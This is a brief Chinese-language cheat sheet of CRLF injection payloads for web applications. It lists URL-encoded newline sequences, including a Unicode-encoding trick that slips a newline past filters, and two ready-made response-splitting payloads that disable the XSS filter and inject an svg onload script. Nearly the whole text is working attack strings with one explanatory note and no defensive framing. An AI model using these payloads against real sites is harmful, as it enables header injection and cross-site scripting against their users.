#clrf分隔符
%E5%98%8A%E5%98%8D ##比如说用户提交的是：%E5%98%8A，这个不包含换行符所以不会被拦截，服务器接收到后将其转成原始的unicode码：U+560A，最后取了0A，这时候就变成换行符了。
%0A%0D

#clrf成熟的payload
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
